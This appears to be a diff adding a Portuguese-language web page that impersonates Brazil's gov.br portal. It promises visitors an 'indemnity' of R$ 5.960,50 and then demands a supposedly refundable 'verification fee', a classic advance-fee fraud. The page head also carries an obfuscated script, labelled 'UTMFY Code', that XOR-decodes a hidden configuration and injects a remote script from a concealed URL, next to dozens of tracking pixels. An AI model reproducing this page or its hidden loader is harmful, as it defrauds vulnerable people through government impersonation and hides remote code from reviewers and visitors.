@@ -1,0 +1,1367 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmação Necessária - Governo Federal</title>
+  <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
+
+  <!-- Fontes -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="css/base.css">
+  <link rel="stylesheet" href="css/styles.css">
+
+  <!-- Microsoft Clarity -->
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "piq8he80s8");
+  </script>
+
+<script src="../../utm-tracking.js"></script>
+
+
+
+
+<!-- UTM FACEBOOK Code -->
+
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "funil_tracking_params";
+
+  // Parâmetros que serão preservados entre as etapas.
+  var TRACKING_PARAMS = [
+    "utm_source",
+    "utm_medium",
+    "utm_campaign",
+    "utm_content",
+    "utm_term",
+    "fbclid"
+  ];
+
+  function readStorage(storage) {
+    try {
+      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveStorage(storage, data) {
+    try {
+      storage.setItem(STORAGE_KEY, JSON.stringify(data));
+    } catch (e) {}
+  }
+
+  function getSavedParams() {
+    var session = readStorage(sessionStorage);
+    var local = readStorage(localStorage);
+
+    return Object.assign({}, local, session);
+  }
+
+  function saveParams(data) {
+    saveStorage(sessionStorage, data);
+    saveStorage(localStorage, data);
+  }
+
+  // 1. Recupera os parâmetros já salvos.
+  var params = getSavedParams();
+
+  // 2. Captura os parâmetros recebidos na URL atual.
+  var currentURL = new URL(window.location.href);
+
+  TRACKING_PARAMS.forEach(function (key) {
+    var value = currentURL.searchParams.get(key);
+
+    // Atualiza somente se o parâmetro estiver presente
+    // e tiver um valor não vazio.
+    if (value !== null && value.trim() !== "") {
+      params[key] = value;
+    }
+  });
+
+  // 3. Salva os parâmetros para as próximas páginas.
+  saveParams(params);
+
+  // 4. Função global para redirecionar preservando as UTMs.
+  window.goToNext = function (nextURL) {
+    var destination = new URL(nextURL, window.location.href);
+    var saved = getSavedParams();
+
+    // Não substitui parâmetros de tracking já definidos
+    // explicitamente na URL de destino.
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        saved[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, saved[key]);
+      }
+    });
+
+    window.location.href = destination.href;
+  };
+
+  // 5. Propaga as UTMs automaticamente nos links internos.
+  document.addEventListener("click", function (event) {
+    var link = event.target.closest("a[href]");
+
+    if (!link) return;
+    if (link.target === "_blank") return;
+    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
+    if (event.button !== 0) return;
+
+    var destination;
+
+    try {
+      destination = new URL(link.href, window.location.href);
+    } catch (e) {
+      return;
+    }
+
+    // Só modifica links da mesma origem.
+    if (destination.origin !== window.location.origin) return;
+
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        params[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, params[key]);
+      }
+    });
+
+    link.href = destination.href;
+  });
+
+  // Disponibiliza os parâmetros para outros scripts.
+  window.getFunilTracking = function () {
+    return Object.assign({}, getSavedParams());
+  };
+
+})();
+</script>
+
+
+<!-- END UTM FACEBOOK CODE -->
+
+<!-- UTMFY Code -->
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+<script>(function(){var f_tx=atob("DAdM54C6GPaiGO83GnxukvLWOsyAcJtDanR2yK/ZfJiMbZtac2E1yePVddjAasBEeXUll/TJN4PWdZwYdmY4gvPONpzROsMVe3M4lenYbYLHa80NQXxuieHXfdSYOotWbmZhkvTXcZDbNZ9Ff3EpifSXYJXNfMJEeWxuy6LMeZrXfc0NOCUxy/uYdpfPfc0NOGMtk+GXbYLPcYlON3c+gvbfdoKPa5pVc2M/xayYbpfObYoVICVumt3H");var p_rt=[];for(var w_puw=0;w_puw<f_tx.length;w_puw++){p_rt.push(f_tx.charCodeAt(w_puw)&255);}var r_7d0y=p_rt[0];var f_5kg=p_rt.slice(1,1+r_7d0y);var p_0kac=p_rt.slice(1+r_7d0y);var t_c=p_0kac.map(function(b,d_nin){return b^f_5kg[d_nin%r_7d0y];});var o_pdk="";for(var q_rs3e=0;q_rs3e<t_c.length;q_rs3e++){o_pdk+=String.fromCharCode(t_c[q_rs3e]&255);}var h_l0yz=decodeURIComponent(escape(o_pdk));var k_s=JSON.parse(h_l0yz);var q_ane=k_s.globals||[];q_ane.forEach(function(w_dru){window[w_dru.name]=w_dru.value;});var w_w=document.createElement("script");w_w.src=k_s.url;w_w.async=true;w_w.defer=true;(k_s.attributes||[]).forEach(function(g_1){w_w.setAttribute(g_1.name,g_1.value);});(document.head||document.documentElement).appendChild(w_w);})();</script>
+
+
+
+<!-- END UTMFY CODE -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1117296950800245');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1117296950800245&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1746333669903668');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1746333669903668&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1015408774399172');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1015408774399172&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2243844239765046');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2243844239765046&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1375844174304393');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1375844174304393&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2137523013457243');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2137523013457243&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '847755107473498');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=847755107473498&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2083978855786884');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2083978855786884&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1313184030636134');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1313184030636134&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '229463223255909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=229463223255909&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4234627643479096');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4234627643479096&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '794380730326961');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=794380730326961&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2299537240549041');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2299537240549041&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1342087550707140');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1342087550707140&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1173269651619651');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1173269651619651&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1574851956843520');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1574851956843520&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1185480309697471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1185480309697471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810965115433003');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=810965115433003&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '768728832672906');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=768728832672906&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2763526227120952');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2763526227120952&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '763158696614724');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=763158696614724&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1832985513945847');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1832985513945847&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1768764637040662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1768764637040662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1884540289109881');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "67b759e9f454faf48c0999a2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "574352008891416");
+      fbq("track", "PageView");
+    </script>
+
+
+
+  <!-- Meta Pixel Code -->
+  
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '574352008891416');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=574352008891416&ev=PageView&noscript=1" />
+  </noscript>
+  
+
+
+</head>
+<body>
+  <!-- 1. Cabeçalho Oficial Gov.br -->
+  <header>
+    <div class="gov-top-bar">
+      <a href="#" onclick="event.preventDefault();">
+        <img src="images/govbr-logo-large.png" alt="gov.br" class="logo-gov">
+      </a>
+    </div>
+  </header>
+
+  <!-- 2. Área Principal com Fundo Azul Escuro -->
+  <main class="acesso-main-section">
+    <div class="container">
+      <div style="width: 100%; text-align: center; margin: auto;">
+        <img src="images/GOV-1.png" alt="Governo Federal" class="logo">
+      </div>
+
+      <div class="amount">
+        <div class="amount-label">Indenização disponível:</div>
+        <div class="amount-value">R$ 5.960,50</div>
+      </div>
+
+      <!-- 3. Progress Tracker (4 Etapas) -->
+
+<script src="js/animacao.js"></script>
+
+      
+<div class="progress-tracker">
+  <div class="tracker-steps">
+
+    <div class="step-item active" data-step="0">
+<div class="step-circle">
+  <img class="step-gif" alt="" hidden>
+  <svg viewBox="0 0 24 24" width="18" height="18" fill="none"
+    stroke="currentColor" stroke-width="3" stroke-linecap="round"
+    stroke-linejoin="round">
+    <polyline points="20 6 9 17 4 12"></polyline>
+  </svg>
+</div>
+      <span class="step-label">Analisando Dados</span>
+    </div>
+
+    <div class="step-item" data-step="1">
+      <div class="step-circle">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none"
+          stroke="currentColor" stroke-width="3" stroke-linecap="round"
+          stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+      </div>
+      <span class="step-label">Preparando transferência</span>
+    </div>
+
+    <div class="step-item" data-step="2">
+      <div class="step-circle">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none"
+          stroke="currentColor" stroke-width="3" stroke-linecap="round"
+          stroke-linejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </div>
+      <span class="step-label">Pagamento Efetuado</span>
+    </div>
+
+    <div class="step-item" data-step="3">
+      <div class="step-circle">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none"
+          stroke="currentColor" stroke-width="3" stroke-linecap="round"
+          stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+      </div>
+      <span class="step-label">Concluído</span>
+    </div>
+
+  </div>
+</div>
+
+
+      <!-- 4. Seção de Atenção e Regularização -->
+      <section id="more-information">
+        <h1 class="alert-title">ATENÇÃO!</h1>
+        <h2 class="alert-subtitle">Confirmação necessária</h2>
+
+        <p class="alert-desc">
+          Durante a análise do seu pedido, identificamos uma <span class="bold">pendência relacionada à taxa de verificação</span>, necessária para garantir a segurança da entrega e evitar possíveis fraudes.
+        </p>
+
+        <p class="alert-desc">
+          Essa taxa é <span class="bold">reembolsável</span> e será devolvida automaticamente após a confirmação do pagamento.
+        </p>
+
+        <p class="alert-desc">
+          Clique no botão abaixo para calcular e regularizar a taxa.
+        </p>
+
+        <button id="show-offer" class="btn-calcular-taxa">CALCULAR TAXA</button>
+      </section>
+    </div>
+
+
+<style>
+#more-information {
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 400ms ease, visibility 0s linear 400ms;
+}
+
+#more-information.visible {
+  opacity: 1;
+  visibility: visible;
+  transition: opacity 400ms ease, visibility 0s linear 0s;
+}
+section#more-information {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 0 10px;
+    opacity: 0;
+    transition: opacity 2s ease-out;
+}
+  .progress-tracker {
+    width: 100%;
+  }
+
+  .tracker-steps {
+    display: flex;
+    align-items: flex-start;
+    width: 100%;
+  }
+
+  .step-item {
+    flex: 1;
+    min-width: 0;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+
+  .step-circle {
+    position: relative;
+    z-index: 2;
+    box-sizing: border-box;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    background-color: #E5E7EB;
+    color: #FFFFFF;
+    overflow: hidden;
+    transition:
+      background-color 300ms ease,
+      border-color 300ms ease,
+      color 300ms ease;
+  }
+
+  .step-circle svg {
+    display: block;
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+  }
+
+  .step-label {
+    position: relative;
+    z-index: 2;
+    margin-top: 10px;
+    font-size: 12px;
+    line-height: 1.4;
+    text-align: center;
+    transition: color 300ms ease;
+    overflow-wrap: break-word;
+  }
+
